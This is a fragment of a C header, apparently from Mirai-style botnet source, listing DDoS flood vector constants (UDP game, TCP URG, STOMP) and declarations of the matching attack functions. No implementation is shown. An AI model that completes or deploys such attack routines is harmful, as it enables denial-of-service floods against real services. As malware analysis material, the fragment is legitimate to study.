...
#define ATTACK_CONCURRENT_MAX   9
...
#define ATK_VEC_UDPHEX     4
#define ATK_VEC_UDPGAME    5
#define ATK_VEC_TCPALL     6
#define ATK_VEC_TCPURG     7
#define ATK_VEC_STOMP      8
...
void attack_udpgame(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcpurg(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcpstomp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
